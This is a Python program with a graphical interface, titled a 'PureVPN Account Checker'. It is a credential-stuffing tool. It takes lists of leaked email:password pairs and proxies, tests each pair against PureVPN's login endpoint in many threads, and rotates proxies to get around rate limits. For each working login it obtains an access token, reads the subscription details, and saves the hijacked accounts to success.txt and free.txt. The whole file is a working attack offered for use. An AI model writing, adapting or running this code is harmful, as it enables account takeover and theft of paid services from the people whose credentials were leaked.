import customtkinter as ctk
import httpx
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import re
from queue import Queue
import os
from pathlib import Path

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class PureVPNCheckerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("PureVPN Account Checker")
        self.geometry("800x600")
        self.resizable(False, False)
        self.attributes('-topmost', True)

        self.combo_file = None
        self.proxy_file = None
        self.use_proxies = False
        self.thread_count = 30
        self.running = False
        self.queue = Queue()
        self.success_count = 0
        self.fail_count = 0
        self.retry_count = 0
        self.free_count = 0
        self.progress = 0
        self.total_accounts = 0

        self.main_frame = ctk.CTkFrame(self, fg_color="#1a1a1a")
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.banner_label = ctk.CTkLabel(
            self.main_frame,
            text="PureVPN Checker\nNeon Dark Edition",
            font=("Courier", 24, "bold"),
            text_color="#00ff00"
        )
        self.banner_label.pack(pady=10)

        self.file_frame = ctk.CTkFrame(self.main_frame, fg_color="#1a1a1a")
        self.file_frame.pack(fill="x", padx=10, pady=5)

        self.combo_button = ctk.CTkButton(
            self.file_frame,
            text="Load Combo",
            command=self.load_combo,
            fg_color="#ff00ff",
            hover_color="#cc00cc",
            text_color="#ffffff"
        )
        self.combo_button.pack(side="left", padx=5)

        self.proxy_button = ctk.CTkButton(
            self.file_frame,
            text="Load Proxy",
            command=self.load_proxy,
            fg_color="#ff00ff",
            hover_color="#cc00cc",
            text_color="#ffffff"
        )
        self.proxy_button.pack(side="left", padx=5)

        self.proxy_checkbox = ctk.CTkCheckBox(self.main_frame, text="Use Proxies", text_color="#00ff00")
        self.proxy_checkbox.pack(pady=5)
        self.proxy_checkbox.select()

        self.thread_label = ctk.CTkLabel(self.main_frame, text="Threads (1-50):", text_color="#00ff00")
        self.thread_label.pack()
        self.thread_entry = ctk.CTkEntry(self.main_frame, width=100, text_color="#ffffff", fg_color="#333333")
        self.thread_entry.insert(0, "30")
        self.thread_entry.pack(pady=5)

        self.output_text = ctk.CTkTextbox(
            self.main_frame,
            height=200,
            fg_color="#333333",
            text_color="#ffffff",
            font=("Courier", 12)
        )
        self.output_text.pack(fill="x", padx=10, pady=5)

        self.progress_bar = ctk.CTkProgressBar(
            self.main_frame,
            mode="determinate",
            determinate_speed=0.1,
            progress_color="#00ff00",
            fg_color="#333333"
        )
        self.progress_bar.set(0)
        self.progress_bar.pack(pady=10)

        self.progress_label = ctk.CTkLabel(self.main_frame, text="Progress: 0%", text_color="#00ff00")
        self.progress_label.pack()
        self.status_frame = ctk.CTkFrame(self.main_frame, fg_color="#1a1a1a")
        self.status_frame.pack(fill="x", padx=10, pady=5)
        self.success_label = ctk.CTkLabel(self.status_frame, text="Success: 0", text_color="#00ff00")
        self.success_label.pack(side="left", padx=10)
        self.fail_label = ctk.CTkLabel(self.status_frame, text="Fail: 0", text_color="#ff0000")
        self.fail_label.pack(side="left", padx=10)
        self.retry_label = ctk.CTkLabel(self.status_frame, text="Retry: 0", text_color="#ff00ff")
        self.retry_label.pack(side="left", padx=10)
        self.free_label = ctk.CTkLabel(self.status_frame, text="Free: 0", text_color="#ffa500")
        self.free_label.pack(side="left", padx=10)

        self.button_frame = ctk.CTkFrame(self.main_frame, fg_color="#1a1a1a")
        self.button_frame.pack(pady=10)
        self.start_button = ctk.CTkButton(
            self.button_frame,
            text="Start",
            command=self.start_checking,
            fg_color="#00ff00",
            hover_color="#00cc00",
            text_color="#000000"
        )
        self.start_button.pack(side="left", padx=5)
        self.stop_button = ctk.CTkButton(
            self.button_frame,
            text="Stop",
            command=self.stop_checking,
            fg_color="#ff0000",
            hover_color="#cc0000",
            text_color="#ffffff"
        )
        self.stop_button.pack(side="left", padx=5)
        self.credits_button = ctk.CTkButton(
            self.button_frame,
            text="Credits",
            command=self.show_credits,
            fg_color="#ff00ff",
            hover_color="#cc00cc",
            text_color="#ffffff"
        )
        self.credits_button.pack(side="left", padx=5)

    def load_combo(self):
        file_path = ctk.filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.combo_file = file_path
            self.output_text.insert("end", f"Loaded combo: {file_path}\n")

    def load_proxy(self):
        file_path = ctk.filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.proxy_file = file_path
            self.output_text.insert("end", f"Loaded proxy: {file_path}\n")

    def load_combos(self):
        if not self.combo_file:
            self.output_text.insert("end", "No combo file loaded!\n")
            return []
        with open(self.combo_file, "r", encoding="utf-8") as f:
            return [line.strip().split(":") for line in f if ":" in line]

    def load_proxies(self):
        if not self.proxy_file:
            return []
        proxies = []
        with open(self.proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    ip, port = parts
                    proxy = f"http://{ip}:{port}"
                elif len(parts) == 4:
                    ip, port, user, pwd = parts
                    proxy = f"http://{user}:{pwd}@{ip}:{port}"
                else:
                    continue
                proxies.append(proxy)
        return proxies

    def check_account(self, combo, proxies):
        email, password = combo
        proxy = None
        if self.use_proxies and proxies:
            proxy = proxies.pop(0) if proxies else None
            if proxy:
                proxies.append(proxy)

        if not email or not password:
            self.fail_count += 1
            self.output_text.insert("end", f"[FAIL] {email}:{password} - Empty credentials\n")
            return

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "fr-FR,fr;q=0.5",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://auth.purevpn.com",
            "priority": "u=0, i",
            "referer": "https://auth.purevpn.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Brave\";v=\"138\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-gpc": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
        }
        data = {
            "captcha_token": "",
            "client_id": "28db0173-36af-4812-8b8d-73877583188c",
            "code_challenge": "",
            "code_challenge_method": "",
            "metaData.device.name": "Windows Chrome",
            "metaData.device.type": "BROWSER",
            "nonce": "",
            "pendingIdPLinkId": "",
            "redirect_uri": "https://purevpn.com/rd",
            "response_mode": "",
            "response_type": "code",
            "scope": "",
            "state": "",
            "tenantId": "9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f",
            "timezone": "Usa/Alaska",
            "user_code": "",
            "showPasswordField": "true",
            "loginId": email,
            "password": password
        }

        try:
            client_kwargs = {"http2": True, "timeout": 10}
            if proxy:
                client_kwargs["proxy"] = proxy
            with httpx.Client(**client_kwargs) as client:
                response = client.post("https://auth.purevpn.com/oauth2/authorize", headers=headers, data=data)
                response_text = response.text
                if any(err in response_text for err in [
                    "Invalid login credentials.",
                    "Email address Email address is a required field",
                    "Password Password is a required field",
                    "Please enter a valid password"
                ]):
                    self.fail_count += 1
                    self.output_text.insert("end", f"[FAIL] {email}:{password} - Invalid credentials\n")
                    return
                elif "Too many requests" in response_text:
                    self.retry_count += 1
                    self.output_text.insert("end", f"[RETRY] {email}:{password} - Too many requests\n")
                    self.queue.put(combo)
                    return
                elif "Complete your account registration" in response_text:
                    self.free_count += 1
                    self.output_text.insert("end", f"[FREE] {email}:{password} - Account registration incomplete\n")
                    with open("free.txt", "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    return
                elif "isSuccess: true," in response_text or "You have been logged out of PureVPN." in response_text or "userState=Authenticated" in str(response.url):
                    match = re.search(r"grant_code : '(.+?)'", response_text)
                    if not match:
                        self.fail_count += 1
                        self.output_text.insert("end", f"[FAIL] {email}:{password} - No grant code\n")
                        return
                    code = match.group(1)

                    token_headers = {
                        "Host": "d11nlh9luc38sm.cloudfront.net",
                        "Connection": "keep-alive",
                        "Cache-Control": "max-age=0",
                        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Microsoft Edge\";v=\"112\", \"Not:A-Brand\";v=\"99\", \"Microsoft Edge WebView2\";v=\"112\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "https://d11nlh9luc38sm.cloudfront.net",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": "https://d11nlh9luc38sm.cloudfront.net/",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate"
                    }
                    token_data = {
                        "grant_type": "authorization_code",
                        "client_id": "2e670c11-7775-4be8-b9d7-3e11d31eb53b",
                        "code": code,
                        "redirect_uri": "https://d9d2xy38i5m2k.cloudfront.net/callbacks/windows-in-app",
                        "code_verifier": "igLrWaFWiGeWyC120oMDdwYDhJCfcGGDoXWgZxYKQOU"
                    }
                    token_response = client.post("https://d11nlh9luc38sm.cloudfront.net/oauth2/token", headers=token_headers, data=token_data)
                    token_json = token_response.json()
                    access_token = token_json.get("access_token")
                    if not access_token:
                        self.fail_count += 1
                        self.output_text.insert("end", f"[FAIL] {email}:{password} - No access token\n")
                        return

                    user_headers = {
                        "Authorization": f"Bearer {access_token}",
                        "Cache-Control": "no-cache",
                        "Host": "d11nlh9luc38sm.cloudfront.net"
                    }
                    user_response = client.get("https://d11nlh9luc38sm.cloudfront.net/oauth2/userinfo", headers=user_headers)
                    user_info = user_response.json()
                    billing_cycle = user_info.get("billingCycle", "")
                    expiry = user_info.get("expiry", [])
                    status = user_info.get("status", "")
                    payment = user_info.get("paymentGateway", "")

                    expiry_dates = [str(date) for date in expiry] if isinstance(expiry, list) else [str(expiry)]
                    trimmed_dates = ",".join([date.strip('[]"\')') for date in expiry_dates]).split(",")
                    today = datetime.today().date()
                    expired = True
                    for date_str in trimmed_dates:
                        try:
                            given_date = datetime.strptime(date_str, "%Y-%m-%d").date()
                            if given_date >= today:
                                expired = False
                                break
                        except ValueError:
                            continue

                    if status != "active" or expired:
                        self.free_count += 1
                        self.output_text.insert("end", f"[FREE] {email}:{password} - Inactive or expired\n")
                        with open("free.txt", "a", encoding="utf-8") as f:
                            f.write(f"{email}:{password}\n")
                    else:
                        self.success_count += 1
                        days_left = (given_date - today).days
                        self.output_text.insert("end", f"[SUCCESS] {email}:{password} | Billing: {billing_cycle} | Expiry: {given_date} | Days Left: {days_left} | Payment: {payment}\n")
                        with open("success.txt", "a", encoding="utf-8") as f:
                            f.write(f"{email}:{password} | Billing: {billing_cycle} | Expiry: {given_date} | Days Left: {days_left} | Payment: {payment}\n")

        except Exception as e:
            self.retry_count += 1
            self.output_text.insert("end", f"[RETRY] {email}:{password} - Error: {str(e)}\n")
            self.queue.put(combo)

    def update_progress(self):
        processed = self.success_count + self.fail_count + self.retry_count + self.free_count
        if self.total_accounts > 0:
            self.progress = processed / self.total_accounts
            self.progress_bar.set(self.progress)
            self.progress_label.configure(text=f"Progress: {int(self.progress * 100)}%")
        self.success_label.configure(text=f"Success: {self.success_count}")
        self.fail_label.configure(text=f"Fail: {self.fail_count}")
        self.retry_label.configure(text=f"Retry: {self.retry_count}")
        self.free_label.configure(text=f"Free: {self.free_count}")
        self.output_text.see("end")
        if self.running and processed < self.total_accounts:
            self.after(100, self.update_progress)

    def run_checker(self):
        self.queue = Queue()
        for combo in self.combos:
            self.queue.put(combo)

        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            futures = [executor.submit(self.check_account, combo, self.proxies.copy()) for combo in self.combos]
            for future in futures:
                if not self.running:
                    break
                future.result()
        self.cleanup()

    def start_checking(self):
        if self.running:
            return
        if not self.combo_file:
            self.output_text.insert("end", "Please load a combo file!\n")
            return
        try:
            self.thread_count = int(self.thread_entry.get())
            if not 1 <= self.thread_count <= 50:
                raise ValueError("Threads must be between 1 and 50")
        except ValueError:
            self.output_text.insert("end", "Invalid thread count! Using default (30)\n")
            self.thread_count = 30

        self.use_proxies = self.proxy_checkbox.get() == 1
        self.running = True
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.combos = self.load_combos()
        self.proxies = self.load_proxies() if self.use_proxies else []
        self.total_accounts = len(self.combos)
        self.success_count = 0
        self.fail_count = 0
        self.retry_count = 0
        self.free_count = 0
        self.progress = 0
        self.progress_bar.set(0)
        self.progress_label.configure(text="Progress: 0%")

        self.checking_thread = threading.Thread(target=self.run_checker, daemon=True)
        self.checking_thread.start()
        self.update_progress()

    def stop_checking(self):
        self.running = False
        self.checking_thread.join(timeout=2)
        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.output_text.insert("end", "Checking stopped!\n")

    def cleanup(self):
        self.running = False
        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.output_text.insert("end", "Checking completed!\n")
        self.update_progress()

    def show_credits(self):
        ctk.CTkToplevel(self, title="Credits").geometry("300x100")
        ctk.CTkLabel(self, text="PureVPN Checker by xAI - Neon Dark Edition", text_color="#00ff00").pack(pady=20)

if __name__ == "__main__":
    app = PureVPNCheckerGUI()
    app.mainloop()